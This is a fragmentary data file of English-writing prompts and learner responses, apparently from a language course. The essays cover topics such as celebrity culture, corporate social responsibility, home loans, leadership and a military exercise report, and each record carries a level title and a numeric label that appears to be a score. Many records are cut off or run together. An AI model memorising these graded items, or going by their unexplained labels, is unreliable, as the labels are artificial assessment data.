An advanced modeling program was created for this purpose. This program was run multiple times to achieve a more accurate result. We determined the impact of various variables such as habitat area, food diversity, and others. As a result, it was determined that habitat loss and reduction in food diversity would be the main factors caused by the construction of the dam. We recommend relocating the local sloth species to the nearby Corona Valley prior to the construction of the dam to prevent ecological cataclysm and possibly even extinction.

Use some of the language you have learned for criticizing in this lesson. Type in the input box. Write 150-200 words. [SEP] Response: The concept of celebrity itself warrants scrutiny. While fame may stem from genuine talent or accomplishment, the nature of modern celebrity often emphasizes superficial qualities over substance. Celebrities, at times, are placed on pedestals based solely on their curated online personas, rather than on meaningful contributions to society. This can create unrealistic ideals that influence public perception, especially among younger audiences, encouraging materialism and unattainable beauty standards.\nFurthermore, the media’s relentless focus on the private lives of celebrities perpetuates a culture that values voyeurism over genuine engagement. For example, the obsession with their relationships, controversies, or fashion choices often overshadows their artistic or professional endeavors. In this way, the celebrity phenomenon can detract from promoting individuals who achieve remarkable feats in science, education, or social activism.\nThat said, many celebrities use their platform to advocate for important causes, showing that fame can be leveraged for positive change. Yet, the fixation on stardom raises the question: Should society shift its focus from idolizing fame to celebrating the unsung heroes who truly make a difference? The answer may lie in recalibrating our values and finding inspiration in those who influence the world behind the spotlight.", "task_id": "121c9e2c-8842-494b-93b1-9af8c82f91f4", "level_title": "16-Upper Advanced", "label": 5}

In the past, companies often prioritized profit over environmental concerns. However, the shift toward sustainable practices is becoming not just an ethical choice but a strategic one as well.\nSustainability in business refers to practices that contribute to the long-term health of the planet, society, and economy. This can range from reducing carbon footprints and conserving water to adopting fair labor practices and supporting local communities. Consumers are increasingly drawn to brands that demonstrate a commitment to sustainability, making it not only a moral responsibility but a business opportunity.\nBusinesses that integrate sustainability into their operations tend to experience long-term benefits, including improved brand loyalty, cost savings through resource efficiency, and attracting top talent. With the increasing demand for eco-friendly products and practices, sustainability is no longer just a trend but a necessity for any business aiming to thrive in the modern world.\n", "task_id": "56de3bdd-b83e-4dd4-9213-446b7e00e3cd", "level_title": "15-Advanced", "label": 0}

What qualities do you think are most important? Do you think everyone has the potential to be a leader? Type in the input box. Write 150-200 words. Use your own words where possible. [SEP] Response: Developing leadership qualities is a vital pursuit for individuals aiming to influence and inspire others effectively, whether in professional settings, community groups, or personal relationships. At its core, leadership is about guiding others towards a shared goal, and this requires a blend of self-awareness, communication skills, and integrity.\n\nSelf-awareness is the cornerstone of effective leadership. By understanding one's strengths and areas for improvement, a leader can harness their abilities more effectively and seek support where needed. This introspection fosters authenticity, allowing leaders to build genuine connections with their team members.\n\nCommunication skills are equally crucial. A successful leader must articulate ideas clearly and listen actively to others. This two-way communication builds trust and encourages open dialogue, fostering an environment where creativity and innovation can thrive. Additionally, empathy in communication helps leaders understand and address the concerns and motivations of their team.\n\nIntegrity and ethical decision-making are fundamental to earning respect and loyalty. Leaders who consistently act with honesty and fairness set a standard for their team, cultivating a culture of trust and accountability. Moreover, adaptability and resilience are essential in navigating challenges and change. Effective leaders remain optimistic and solution-focused, inspiring their teams to persevere through adversity.\n\nIn summary, developing leadership qualities involves a commitment to personal growth, effective communication, ethical conduct, and adaptability.

Companies with a good CSR record are rewarded by customer loyalty. Consumers are happy, the company performs well and communities around the world benefit.As an integrated part of society, corporations need to conform to social expectations, and that entails helping the community.\nAgainst CSR\n\nThe problem with corporate social responsibility is that corporations don't have social responsibility. Milton Friedman has pointed out that the real responsibility of business is to increase its profits; business is not answerable to society's expectations but to the shareholders'.It's great that corporations are spending huge sums of money on development projects across the world, but these sums of money are usually still inconsiderable relative to total earnings. In this sense, it's still quite a cheap marketing device to buy a good public image.", "task_id": "8f1a0c16-d259-4737-af06-b6b6eb9e9799", "level_title": "13-Advanced", "label": 4}

Write 100–175 words. [SEP] Response: Summary Report on Collarless Dress Shirt Survey\n\nMethods:\nThe survey was conducted in two major cities, Rio de Janeiro and Shanghai, with a sample size of 1000 participants in each location. The sample covered all demographics to ensure a comprehensive understanding of the population's opinion on the collarless dress shirt. Participants were asked how they felt about the product, including whether they would consider purchasing it.\n\nFindings:\nIn Rio de Janeiro, 35% of respondents approved of the collarless dress shirt, with 20% indicating they would buy it. Conversely, 65% did not approve. In Shanghai, the approval rate was significantly higher at 80%, with 40% willing to purchase the shirt, while 20% did not approve. The primary reasons for disapproval in both cities included issues with design, size, color, and material.\n\nConclusions:\nThe survey results indicate a stark contrast between the two cities. While the collarless dress shirt received a favorable response in Shanghai, it was not well-received in Rio de Janeiro. The feedback suggests that the product's design and execution did not meet the expectations of a significant portion of the respondents. Additionally, the lack of diversity consideration in the product design was a common concern.\n\nRecommendations:\nTo improve the product's acceptance, it is recommended to conduct more in-depth market research to understand what men want and need in an accessory. Enhancements in design should focus on attention to detail, such as stitching color. The size should be adjusted to offer a slim fit, and the color options should include strong primary colors as well as black and white. The material should be wrinkle-free and/or sweat absorbent. Prioritizing changes for the Rio de Janeiro market is crucial, as the results from Asia are already satisfactory.\n\nIf you have any queries or need further information, please do not hesitate to contact James Tufnell, Head of Research.", "task_id": "c4a6991e-c330-41bd-88de-31bb25ee4bf1", "level_title": "Correspondence", "label": 5}

The upside? A rise in budget airlines means cheaper options for travelers on a budget.\n3- The Rise of Space Tourism: While still a luxury only the super-rich can afford, space travel is no longer just science fiction.

Write 150-200 words. [SEP] Response: One legendary creature that I find particularly interesting is the Japanese **Kappa**. The Kappa is a mythical being from Japanese folklore, often described as a river imp or water sprite. It is said to inhabit ponds and rivers across Japan. The appearance of a Kappa is quite distinctive: it is typically depicted as a child-sized creature with scaly, reptilian skin that is green or yellow-green in color. Its most unique feature is the water-filled dish on top of its head, which is believed to be the source of its power.\n\nKappas are known for their mischievous and sometimes malevolent behavior, often blamed for drowning livestock and people. However, they are also said to be intelligent, and they are curious about human society. One of the ways to protect oneself from a Kappa is to bow deeply; being polite creatures, they would feel compelled to return the bow, causing the water to spill from their head and rendering them powerless.\n\nInterestingly, Kappas are also reputed to have a love for cucumbers, which can be used to appease them. It is a common practice in some regions to throw cucumbers into the water with the names of family members inscribed on them to keep the Kappa away.\n\nDespite their potential for harm, Kappas are sometimes depicted as friendly and helpful, especially if treated kindly by humans. They are known to have great knowledge of medicine, and there are stories of Kappas teaching these secrets to humans in gratitude for their kindness. The Kappa remains a popular figure in Japanese culture, appearing in literature, art, and even modern media, symbolizing the complex relationship between humans and the natural world.", "task_id": "f03e111e-8a30-48fe-991b-6adfea2444ad", "level_title": "16-Upper Advanced", "label": 5}

Additionally, the presence of a moderator may unintentionally steer discussions, leading to biased results. They are also time-consuming and costly to organize.\n\nSurvey: Surveys can reach a large audience quickly, but they often lack depth and context. Respondents may misunderstand questions or provide socially desirable answers instead of truthful ones. Low response rates and the inability to clarify responses in real time also pose challenges.\n\nInterview: Although interviews allow for in-depth exploration of topics, they are time-intensive and can be expensive, especially when conducted in person. The interviewer's presence may also introduce bias, as respondents might tailor their answers to please the interviewer.

Persuade your design team to choose one of the designs for next year’s rollout. Write 100-150 words. [SEP] Response: When comparing the two car designs, the XZ3 and XZ3E, there are several notable differences and similarities worth highlighting. Both vehicles offer modern design aesthetics, advanced technology integrations, and impressive performance capabilities, but the XZ3E takes a significant leap toward sustainability with its hydrogen fuel system.\n\nThe XZ3 is a standard gasoline-powered vehicle, known for its robust performance, sleek exterior design, and comfortable interior. It features a powerful internal combustion engine that delivers strong acceleration and reliable long-distance travel. The car's design is both aerodynamic and stylish, making it a visually appealing option for a variety of drivers. It also offers a range of safety features, high-end infotainment systems, and advanced driving aids, making it a well-rounded choice for those who value a dynamic and reliable traditional vehicle.\n\nOn the other hand, the XZ3E, while sharing many design cues with its conventional counterpart, distinguishes itself with its eco-friendly hydrogen fuel cell technology. This environmentally conscious approach drastically reduces the car's carbon footprint, emitting only water vapor as a byproduct. The XZ3E maintains the XZ3’s advantageous features such as sleek design, comfort, and advanced technology, but with a greener propulsion system that appeals to the environmentally aware consumer.\n\nIn terms of performance, while both cars are engineered for reliability and efficiency, the XZ3E's hydrogen fuel system provides a different driving experience. This model has the advantage of quicker refueling times compared to battery electric vehicles, presenting a convenient alternative for longer travel without the extended downtime associated with charging electric cars.\n\nIn summary, while the XZ3 stands out for its traditional gasoline-powered performance and stylish design, the XZ3E offers an equally attractive yet greener alternative with its hydrogen fuel technology. The choice between these two vehicles ultimately depends on the driver’s priorities – whether they lean towards conventional performance or a sustainable, eco-friendly driving experience.", "task_id": "64058d7e-9b06-4ed8-9b01-5b7efb9fb3ef", "level_title": "Automotive", "label": 5}

The Naga are serpent-like beings that hold a significant place in Hindu, Buddhist, and Jain traditions. They are often depicted as half-human, half-snake, with the upper body of a human and the lower body of a serpent. In some stories, they can also take on a fully human or fully serpent form.\n\nNagas are believed to reside in the underworld, known as Patala, and are considered guardians of treasures and water bodies like rivers, lakes, and seas. They are revered for their wisdom and power but can also be fearsome when provoked. In Hindu mythology, the Naga king, Shesha, is said to hold the universe on his thousand heads, while another famous Naga, Vasuki, serves as a churning rope in the myth of the churning of the ocean.\n\nThese creatures are often associated with fertility and prosperity, and their blessings are sought for good harvests and protection from snake bites. Despite their fearsome appearance, Nagas are generally seen as benevolent beings who play a crucial role in maintaining balance in the natural world.", "task_id": "f03e111e-8a30-48fe-991b-6adfea2444ad", "level_title": "16-Upper Advanced", "label": 5}

{"text": "Prompt Level: 16-Upper Advanced [SEP] Prompt: In the preceding units, nine writing techniques were introduced: metaphor, hyperbole, symbolism, free writing, focused free writing, loop writing, listing, questioning and cubing. Write a paragraph or two explaining which techniques seem most useful to you. Type in the input box. Write 150-200 words. [SEP] Response: Several writing techniques stand out as particularly useful to me, depending on the purpose of the writing. Metaphor is one of the most powerful tools, as it allows complex ideas to be explained in a more relatable way. Comparing something unfamiliar to something well-known helps readers visualize and understand concepts more deeply. Similarly, symbolism adds depth to writing by giving objects or actions a greater meaning beyond their literal sense.\n\nFor generating ideas, I find focused free writing and listing to be the most effective. Focused free writing allows thoughts to flow naturally while staying on topic, helping to overcome writer’s block. Listing, on the other hand, is an excellent way to organize thoughts quickly and see connections between ideas. Questioning is another valuable technique, as it encourages deeper exploration of a topic by considering different perspectives.\n\nWhile all nine techniques have their benefits, I find that a combination of metaphor, focused free writing, and questioning works best for both creative and analytical writing. These methods help clarify thoughts, engage readers, and create more compelling content..\n\n", "task_id": "81ee255e-d4fa-4f81-b77f-dfcf3b5cf541", "level_title": "16-Upper Advanced", "label": 5}

[SEP] Response: **Section: Psychological Operations – Observations and Recommendations**\n\nThe psychological operations (PsyOps) element of the exercise fell significantly short of expectations, despite substantial investment in training and resources. The component lacked coordination, clarity, and effective leadership. Key failures stemmed from delayed decisions on leaflet content, resulting in late production and distribution. A last-minute shift to produce leaflets in Arabic, English, and Farsi led to logistical confusion, with aircraft dropping materials in incorrect areas. These errors provoked protests from participants and real-world diplomatic observers due to the inappropriate content and poor translation.\n\nThe civil exercise cell was poorly staffed, reportedly with inexperienced interns, and lacked leadership. There was minimal effective communication between the civil and military PsyOps teams, aggravated by language barriers and unclear instructions.\n\nFor future exercises, a more defined command structure is essential. Pre-exercise briefings must be thorough, timely, and inclusive. PsyOps teams require experienced personnel, stronger language capabilities, and better integration with multinational partners. Early coordination of messages and delivery logistics is critical.

[SEP] Response: Buying a home and applying for a home loan in my country can be both exciting and stressful. The process is not overly complicated, but it does involve a fair amount of paperwork and patience. First, most people get pre-approved for a mortgage by a bank or lender. This requires providing proof of income, bank statements, credit history, and other financial details. Interest rates can vary, but they typically range between 3% and 5%, depending on the market, the loan type, and the borrower’s credit score.\n\nHousing prices have risen significantly in recent years, especially in major cities. In some areas, it’s very difficult for first-time buyers to afford a home without financial help from family or government programs. A 20% down payment is often expected, although some lenders allow smaller deposits with additional conditions.\n\nWhile it’s not legally required to use a real estate agent or mortgage broker, many buyers choose to do so to make the process easier. Agents help find suitable properties and negotiate prices, while mortgage brokers compare loan options from different lenders.\n\nOverall, buying a home here takes time and careful planning. There are quite a few forms to fill out, but with the right support and preparation, it’s definitely manageable.

Advanced computer simulations were employed to evaluate the effects of habitat loss and changes in food availability. The results indicate that these two factors will significantly contribute to a decline in sloth populations. To mitigate these adverse effects, it is recommended to relocate the sloth species to the neighboring Corona Valley before the dam construction commences. This proactive measure can help prevent ecological catastrophe and potential extinction of the sloth populations in the Sun Valley region.\n\nThe simulations considered various factors, including the extent of habitat loss, changes in food variety, and the impact of construction activities on sloth behavior and survival rates. The results consistently demonstrated that the combination of habitat loss and reduced food availability would pose the most significant threats to sloth populations. By relocating the sloths to a suitable alternative habitat, it is possible to minimize these negative impacts and ensure their long-term survival.", "task_id": "76bba4e9-a91a-49e2-89a6-129b5a013873", "level_title": "Sciences", "label": 5}

Eventually, though, we ended up back in St. Louis, where we've been living for the past year.\n\nI'm working for a design firm, and Stella has been teaching in a university. We bought a little two-bedroom house in the suburbs, and we're basically happy, but sometimes we feel that something's missing. The suburbs are crowded, and the houses all look the same. Jeremy left for college, so we're lonely, old empty nesters looking for a change. We're actually thinking about adopting a child. At our age, are we crazy?\n\nAnyway, let's reconnect. Your kids must be all grown up now. How are they doing? Please send photos!", "task_id": "23c3d59a-61d5-470f-90d1-1217b0006929", "level_title": "10-Upper Intermediate", "label": 5}

In fact, our partners have specifically highlighted our commitment to quality, which is something we can all be proud of.\n\nOf course, reaching this point wasn’t without its challenges.

At the same time, we strengthened our Quality Assurance framework. None of this would have been possible without the incredible teamwork across departments, ensuring we tackled issues together.\n\nLooking ahead, our focus remains clear: continued support, proactive problem-solving, and an unwavering commitment to excellence.

{"text": "Prompt Level: 16-Upper Advanced [SEP] Prompt: Write about buying a home and applying for a home loan in your country. How easy or difficult is the process? Are there a lot of forms to fill out? Is housing expensive? What are the interest rates? Do you need to use a real estate agent or mortgage broker? Type in the input box. Write 200-250 words. [SEP] Response: Buying a home and applying for a loan in the Philippines can be a multifaceted process, presenting both opportunities and challenges. The ease or difficulty often hinges on factors such as one's financial preparedness, knowledge of local regulations, and access to reliable information. While the dream of homeownership is strong, potential buyers must navigate a landscape that can appear daunting at first glance.\nThe process typically involves a significant amount of paperwork. From income verification and employment certificates to property titles and tax declarations, the sheer volume of forms can be overwhelming. Each document plays a crucial role in establishing eligibility and ensuring legal compliance.\nHousing expenses, particularly in urban centers like Metro Manila, can be substantial. Property values have seen a steady increase, making affordability a key consideration for many. Beyond the purchase price, buyers must also account for various fees, including transfer taxes, registration fees, and attorney's fees, which can add considerably to the overall cost.\nInterest rates on home loans in the Philippines are dynamic and influenced by various economic indicators. Understanding the prevailing rates and how they might fluctuate is essential for long-term financial planning. Banks offer different loan products with varying terms and interest structures, requiring careful comparison to find the most suitable option.\nEngaging with a real estate agent or a mortgage broker is often a strategic move. A real estate agent can assist in finding suitable properties, negotiating prices, and guiding buyers through the initial stages of the purchase. On the other hand, a mortgage broker specializes in helping individuals secure home loans. They can simplify the application process, compare loan offerings from multiple banks, and provide expert advice on financial eligibility and documentation. Their expertise can significantly streamline what can otherwise be a complex and time-consuming endeavor, ultimately making the journey to homeownership more manageable.\n", "task_id": "e56737ef-22af-472e-88bd-a73361bcb7d9", "level_title": "16-Upper Advanced", "label": 5}

Governments lose tax revenue, impacting public services. Additionally, counterfeit goods can endanger consumers through poor-quality materials, electrical hazards, or harmful chemicals.\n\nSigns of a Fake\n\nTo spot counterfeit goods:\n\t•\tPrice: If it’s too good to be true, it probably is.\n\t•\tPackaging: Look for spelling errors, poor-quality printing, or missing labels.\n\t•\tSeller Reputation: Avoid unauthorized retailers or online platforms without verified credentials.\n\t•\tProduct Quality: Check for differences in materials, stitching, or performance.\n\nWhat to Do if You Discover Fake Goods\n\t•\tReport the Seller: Notify the platform, manufacturer, or authorities.\n\t•\tAvoid Purchases: Refuse to support counterfeit markets.\n\t•\tEducate Others: Spread awareness about the risks of counterfeit goods.\n\nBy understanding the dangers and identifying counterfeit products, consumers can make informed decisions and help combat this global issue.

After years of negotiation, the agreement officially came into force in January 1994. Its primary aim was to reduce or eliminate customs duties and trade barriers among the member countries to promote a free flow of goods and services.\n \nNAFTA has had a profound impact on trade relations within North America, particularly in the agricultural sector. For example, the agreement allowed for a smoother export of Mexican fruits and vegetables to the U.S., benefiting both producers and consumers. Over time, NAFTA facilitated increased economic activity and created new market opportunities for businesses in all three countries.\n \nHowever, the agreement also brought both positive and negative effects. While many industries and consumers benefited from reduced costs and expanded markets, some sectors faced job losses due to shifts in manufacturing and production.\n \nDespite some of its drawbacks, NAFTA overall has provided considerable benefits to all three member nations by enhancing trade efficiency, economic integration, and competitiveness on the global stage.", "task_id": "8677dea6-ea22-4957-9351-7733852f29a3", "level_title": "13-Advanced", "label": 5}

[SEP] Response: Among the nine writing techniques introduced, I find metaphor, focused free writing, and questioning to be the most useful for developing my ideas and enhancing my expression. Metaphor allows me to express abstract thoughts and emotions in creative and powerful ways by comparing them to more tangible or relatable things. This helps deepen meaning and create vivid images for the reader. Focused free writing is especially helpful when I have a topic in mind but don’t know where to begin. It helps me stay on track while still exploring new angles of the subject. It encourages flow without the pressure of perfection. Lastly, questioning helps me explore my topic in depth by challenging my assumptions and pushing me to consider different perspectives.

Luckily it was a young one, so the injuries weren't too bad. And soon after, a nearby ship came and rescued me from the ocean. That ship belonged to AF Shipping, and it inspired me to start my own shipping company.  \n \nI guess the moral of that story is that inspiration can come from the most unexpected place.

Write a paragraph or two explaining which techniques seem most useful to you. Type in the input box. Write 150-200 words. [SEP] Response: Cubing is a technique for exploring a topic from different perspectives. It involves looking at a subject through six angles: describing, comparing, associating, analyzing, applying, and arguing. Each angle, or \"side\" of the cube, offers a unique way to understand the topic better. For example, \"describing\" helps define it clearly, and \"comparing\" finds similarities and differences. \n\"Associating\" connects it with related ideas, and \"analyzing\" breaks it into parts. \"Applying\" considers practical uses, and \"arguing\" challenges the idea. By examining each side, cubing helps people think deeply and creatively, making it useful for writing, problem-solving, and decision-making. Asking questions over and over until we find the answers that linger in the depth of problem is a great way to find solutions beyond the boundaries of our imagination.\nConsidering effectiveness of the listing technique for some logically driven minds seems a better option sometimes, however it's incumbent upon the person to find the best technique for their personality traits.

Use the language and strategies you have learned in this lesson. Type in the input box. Write 150-200 words. [SEP] Response: Hi Harry,\n\nWelcome aboard! Motivating a team effectively starts with understanding what drives each individual. Start by building trust—take time to listen and learn about your team members’ strengths, goals, and challenges. Recognize good work consistently; even small wins deserve acknowledgment. A simple \"thank you\" or public praise can go a long way.\n\nSet clear, achievable goals and involve your team in decision-making where possible. This gives them ownership and boosts engagement. Also, create opportunities for growth—offer stretch assignments or support their learning paths.\n\nAvoid micromanaging—it signals a lack of trust and can demotivate even high performers. Similarly, steer clear of one-size-fits-all approaches; what works for one person may not inspire another. Lastly, don’t ignore conflict or underperformance. Address issues early and constructively to maintain morale and team cohesion.\n\nMotivation is an ongoing process, not a one-time action. Keep communication open, stay approachable, and lead by example. Your team will reflect the energy and attitude you bring every day.\n\nBest of luck,\nEF Student", "task_id": "b4ba34ff-949d-4a82-9f56-ea472f177a71", "level_title": "13-Advanced", "label": 4}

To be fair, she has shown skill in marketing and personal branding, but many argue that she represents the more superficial side of fame.\n\nIt could be said that celebrities like her promote unrealistic beauty standards and materialism. For instance, her frequent use of photo editing and cosmetic procedures may contribute to young people feeling inadequate about their own appearances. Furthermore, some would argue that she rarely uses her platform to advocate for meaningful causes, although she has recently tried to rebrand herself as a legal reform activist.\n\nIn my opinion, the obsession with celebrity culture, especially with people who are famous for being famous, distracts society from more important issues.

The aircraft approached the runway at a higher-than-normal speed, causing a hard touchdown. Additionally, the left landing gear briefly lost contact with the surface due to wind shear, resulting in a slight lateral skid. No injuries were reported, and the aircraft sustained only minor damage.\n\nPreliminary analysis suggests contributing factors include variable crosswinds and a delayed approach correction. The pilot managed to regain control quickly and taxied safely to parking. Further inspection and debrief with the flight crew have been scheduled.\n\nRecommendations include a review of landing procedures under crosswind conditions and refresher training on handling sudden wind changes during final approach.\n\nReport prepared by: David\nTitle: Shift supervisor\nDate: 3.7.2025", "task_id": "0036dfef-10e2-4124-8ee7-cc03ab655ec1", "level_title": "Aviation", "label": 5}

[SEP] Response: Developing leadership qualities is an ongoing process that requires intentional effort, self-awareness, and experience. For me, it began with taking on small responsibilities and gradually expanding my role in group settings. Early in my leadership journey, I learned the importance of communication. I remember leading a team project where the expectations were unclear, and I struggled with guiding my teammates effectively. I realized that clear communication and active listening were key to ensuring everyone was on the same page.\n\nOver time, I developed a deeper sense of empathy. I found that understanding the individual strengths and weaknesses of team members helped me to delegate tasks more effectively and boost morale. A pivotal moment in my growth as a leader was when I faced a challenge where a project was behind schedule. Instead of taking over, I trusted my team, sought their input, and facilitated problem-solving, which not only saved the project but also strengthened our collaboration.\n\nNow, I focus on continuous self-improvement and learning from both my successes and failures.

I wanted to give you a brief overview of the key points I plan to cover in my upcoming speech.\n\nI will begin by introducing the purpose of the meeting and explaining the context surrounding the training decision. I’ll mention the two companies we evaluated, TrainQuick and Skills Pro, and highlight their respective strengths and weaknesses.

In contrast, Skills Pro offers higher quality, though at a higher cost, but the feedback shows that those who complete the courses find them rewarding and successful.\n\nI will emphasize why I believe Skills Pro is the right choice, considering the long-term benefits of investing in quality training. I’ll also touch upon their plans for course expansion, which could provide continued growth and value for our team.\n\nLastly, I will open the floor for any questions or feedback, ensuring a collaborative discussion.\n\nThank you for your support, and I look forward to presenting my ideas.\n\nBest regards,\nchandu\n\n\n\n", "task_id": "cfc369d9-74da-4013-be4c-b8148993f658", "level_title": "14-Advanced", "label": 5}

Common issues cited by those dissatisfied included concerns about design, size, color, and material.\n\nConclusions:\nThe collarless dress shirt has strong potential in Shanghai but faces significant resistance in Rio. Lack of market research and poor execution were major criticisms, suggesting that consumer expectations were not fully addressed.\n\nRecommendations:\nImmediate improvements are needed, particularly in Rio.

Use some of the language you have learned for criticizing in this lesson. Type in the input box. Write 150-200 words. [SEP] Response: Leonardo DiCaprio has long positioned himself as a champion of environmental causes, using his platform to raise awareness of issues like climate change and deforestation. However, his pious posturing often rings hollow when compared to his personal lifestyle. While he endorses sustainability, he continues to travel the world in private jets and luxury yachts, burning more fossil fuels in a single trip than the average person does in a year. This glaring double standard undermines his credibility and raises questions about whether he genuinely cares about the environment or simply enjoys being seen as its savior.\nLike many media-savvy celebrities, DiCaprio knows how to nourish a belief in his own virtue, carefully curating an image of activism while still earning big bucks from high-paying Hollywood deals and partnerships. Meanwhile, ordinary people are expected to make sacrifices - cutting meat, reducing flights, and consuming less -while he continues to live extravagantly.\nSomeone needs to take him down a peg or two and remind him that real change requires action, not just well-crafted speeches. If he truly wants to emulate a model of sustainability, he should start by practicing what he preaches. Otherwise, people will begin to bad-mouth his so-called activism for what it really is - hypocrisy dressed as heroism.", "task_id": "121c9e2c-8842-494b-93b1-9af8c82f91f4", "level_title": "16-Upper Advanced", "label": 5}

Birds in mid-flight hung like decorations. My neighbor’s cat froze mid-pounce. Even my Wi-Fi stopped buffering.\n\nThen things got weirder. The sneeze must’ve triggered some kind of lunar allergy because the moon began sniffling. A small comet floated up with a giant tissue — yes, with little stars printed on it — and gently dabbed the moon’s surface. Where it touched, new craters formed, and one of them looks suspiciously like a thumbs-up emoji.\n\nThis morning, no news channel mentioned it. No social media buzz.

Use the language and strategies you have learned in this lesson. Type in the input box. Write 150-200 words. [SEP] Response: Dear Harry,\n\nCongratulations for your promotion as a Manager.\n\nOne of the most important aspect of being a successful Manager is to have a high performance team.\n\nIn this sense, it is important to have the team motivated. A motivated team is a group that normally produces much more than a demotivated team. Also when you motivate a team it is willing to reach higher standards of quality. Consequently, the company benefits from motivated teams. Additionally, there are also clear benefits for each team member because when an individual has a good performance and a high level of excellence in the services or products where he is involved of his professional career will be enhanced by these skills giving him more opportunities to move forward for reaching a promotion.\n\nBut how can you have a team motivated? There are some key aspects to have into account:\n\n- Listen every team member of your team carefully. If each one realize that you are listening honestly and sympathetically to them then you will build trust on your team.\n\n- Work with your team on a collaborative way. It is not a micromanagement format it is all about how to help them to reach higher goals with your support.\n\n- Recognise their goals in public and reward them. It is not needed to give them more money, sometimes it would be enough with some extra days off, other times a costly and customized training would be more valuable from their perspective to feel rewarded.\n\n- Avoid things like: be angry, don’t praise people when they deserve. If you do these things make sure that you will have a demotivated team.\n\nGood luck with the challenge of having a motivated team.\n", "task_id": "b4ba34ff-949d-4a82-9f56-ea472f177a71", "level_title": "13-Advanced", "label": 3}

Even the guidelines of the prime banking institution  of the country is not adequately followed. Unnecessary documents and insurances are  forced while taking the loan. I can tell it was not a cherished experience. The excitement of buying a home absolutely went down the drain owing to such complex, confusing and misguided process followed by bank. I felt three things should absolutely be followed while banks take up such processes which are transparency clarity and communication, to make the entire process little easier for first time home buyers who aspire to take a loan.

[SEP] Response: creative writing techniques \nCreative writing techniques enhance storytelling by making narratives more engaging and vivid. One technique is show, don’t tell, which encourages writers to use descriptive language and action to convey emotions, rather than directly stating them. For example, instead of saying \"she was sad,\" describe her trembling hands or the way she gazes out the window. Imagery is another powerful tool, where sensory details are used to paint pictures in readers' minds, like describing the scent of rain or the warmth of sunlight on skin. Metaphors and similes also add depth, comparing one thing to another to evoke emotion or provide insight, like \"her voice was a whisper of silk.\" The Dialogue can reveal character personalities and drive plot, making interactions feel natural and authentic.

Write a paragraph or two explaining which techniques seem most useful to you. Type in the input box. Write 150-200 words. [SEP] Response: The free writing technique is a valuable tool for developing creativity, overcoming writers block and enhancing flow of ideas. By allowing writers to write continuously without worrying about grammar, punctuation, or structure, free writing encourages the mind to explore thoughts freely and organically. This process often leads to unexpected insights, new perspectives, and original ideas that might not emerge under more restrictive writing conditions. It removes the fear of making mistakes and helps silence the inner critic, which can often hinder the creative process.\nMoreover, free writing serves as a warm-up exercise that gets the brain engaged before starting more structured writing tasks. It helps writers discover their voice and develop confidence in their expression. For students and professionals alike, it can be particularly useful in brainstorming, drafting, or simply breaking through periods of mental stagnation. By cultivating a habit of free writing, individuals can improve their overall writing fluency. Overall, the technique supports both personal expressions and skill development, making it a powerful tool for writers of all levels.", "task_id": "81ee255e-d4fa-4f81-b77f-dfcf3b5cf541", "level_title": "16-Upper Advanced", "label": 5}

In particular, employees at our other branch have not been using the program, and there have been complaints about mixing staff from different branches in the same classes. These factors may reduce engagement and effectiveness.\n\nOn the other hand, although Skills Pro is more expensive, the overall quality appears to be higher. Some employees have described the course content as challenging, but most participants complete it successfully. This suggests that the program is both rigorous and well-structured. Additionally, Skills Pro has plans to expand their course offerings, which may benefit us in the future.\n\nIn conclusion, despite the higher cost, Skills Pro provides a more professional and successful learning experience.

Each setback carries a lesson that can guide us forward if we’re willing to listen.\n\nSurrounding ourselves with positive, supportive people also plays a big role. These relationships encourage us, hold us accountable, and celebrate our progress.\n\nIn the end, personal growth isn’t a destination—it’s a lifelong journey.

Write the report as clearly and concisely as possible. Write 150-200 words. [SEP] Response: Section: Observations and Recommendations on Psychological Operations\n\nDuring the exercise, the effectiveness of psychological operations (PSYOP) was assessed in influencing target audiences and shaping the operational environment. Observations revealed that tailored messaging, aligned with cultural and sociopolitical factors, had a significant impact on altering perceptions and behaviors. The use of multimedia platforms, including social media, was particularly effective in disseminating messages rapidly and broadly.\n\nHowever, several challenges were noted. Insufficient local expertise led to generic messaging that was less effective in resonating with specific demographics. Additionally, inadequate synchronization with overall operational objectives occasionally resulted in conflicting narratives.\n\nTo enhance the impact of PSYOP, we recommend the following:\n\n1. Invest in Local Expertise: Employ region-specific specialists to ensure messaging is culturally and contextually relevant.\n\n2. Strengthen Coordination: Establish clear communication channels between PSYOP teams and other operational units to align messaging with overarching goals.\n\n3. Leverage Emerging Technologies: Incorporate advanced data analytics and artificial intelligence to refine audience targeting and assess message efficacy in real time.\n\nThese recommendations aim to improve the strategic effectiveness of psychological operations in future excises and real-world scenarios.\n\n", "task_id": "1dc879f7-2765-4ba4-90f6-522fa596e03c", "level_title": "Military", "label": 5}

Remember the structure you've learned on how to construct an argument. Write 200-250 words. [SEP] Response: Do you believe companies have a responsibility to society? Or do you think a company's only responsibility is to its shareholders? We invite you to join this discussion by posting your opinion on corporate social responsibility (CSR). Below are some quotes from recent submissions. We look forward to hearing from you!\n\nFor CSR\n\nCompanies have a big impact on society. They should help the communities where they operate. After all, those communities are letting them do business there. It's a two-way street. And it's the same with sustainable operations and fair employee benefits. The former secures future possibilities, and the latter ensures high productivity and low turnover.\n– lil@213\n\nThe reason CSR makes good business sense, the reason it contributes to the bottom line, is because consumers care. Companies with a good CSR record are rewarded by customer loyalty. Consumers are happy, the company performs well and communities around the world benefit.\n– Jack@MSU\n\nAs an integrated part of society, corporations need to conform to social expectations, and that entails helping the community.\n– James.W@efstudent.com\n\nAgainst CSR\n\nThe problem with corporate social responsibility is that corporations don't have social responsibility. Milton Friedman has pointed out that the real responsibility of business is to increase its profits; business is not answerable to society's expectations but to the shareholders'.\n– theG8T\n\nIt's great that corporations are spending huge sums of money on development projects across the world, but these sums of money are usually still inconsiderable relative to total earnings. In this sense, it's still quite a cheap marketing device to buy a good public image.\n– JackD_92\n\nIt's the government's job to make and enforce laws and regulations that will benefit the greater public. Corporations will need to conform to these regulations, but by no means should they be put in the driver's seat.\n– patty925\n", "task_id": "8f1a0c16-d259-4737-af06-b6b6eb9e9799", "level_title": "13-Advanced", "label": 0}

